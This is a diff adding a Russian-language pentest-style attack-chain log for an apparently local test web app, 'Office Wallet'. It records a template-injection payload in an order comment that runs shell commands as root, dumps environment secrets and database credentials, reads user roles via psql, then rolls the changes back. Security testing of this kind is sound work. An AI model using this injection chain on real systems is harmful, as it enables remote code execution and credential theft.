@@ -1,0 +1,50 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-6
+################################################################################################
+== Ц-6 · RCE → root в контейнере → прямой доступ к базе ==
+    · Комментарий заказа исполняется как sh -c в превью (OW-08); контейнер
+    · работает от root (OW-42); DSN базы и в репозитории, и в окружении —
+    · та же база читается напрямую через psql (OW-34).
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 198936300
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment={{exec "id"}} {{exec "hostname"}} {{exec "env"}} Ц-6
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=166
+    ← HTTP 302 redirect=http://localhost:18081/orders/233  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → GET /orders/233/preview?renderer=classic  (item_comment → sh -c)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Превью чека · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → SQL SELECT login||' | '||role FROM users ORDER BY id
+    ← psql ivanov | admin
+    petrova | employee
+    sidorov | employee
+    kassa | cashier
+    buch | accountant
+    adminw | admin
+    ow24test | employee
+    ┌─ АРТЕФАКТ · Ц-6 · команда выполнена от root, база открыта
+    │ GET /orders/233/preview → HTTP 200
+    │ вывод команды: Чек: uid=0(root) gid=0(root) groups=0(root) 4a1860a837ac DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    │   PAYMENT_KEY=office-wallet-pay-key
+    │   SESSION_KEY=office-wallet-session-key
+    │ docker exec office-wallet-main-app-1 id -u → 0
+    │ psql -U wallet -d wallet: ivanov | admin; petrova | employee; sidorov | employee; kassa | cashier
+    └─
+    → SQL DELETE FROM operations WHERE memo='Заказ #233' OR memo='Возврат заказа #233'
+    ← psql DELETE 1
+    → SQL DELETE FROM orders WHERE id=233
+    ← psql DELETE 1
+    → SQL DELETE FROM checkout_quotes WHERE item_comment='{{exec "id"}} {{exec "hostname"}} {{exec "env"}} Ц-6'
+    ← psql DELETE 1
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → SQL UPDATE users SET balance_kop=198936300 WHERE login='ivanov'
+    ← psql UPDATE 1
+    откат: баланс 198936300, заказ/котировка/корзина удалены
+[+] RCE от root подтверждён, база читается напрямую
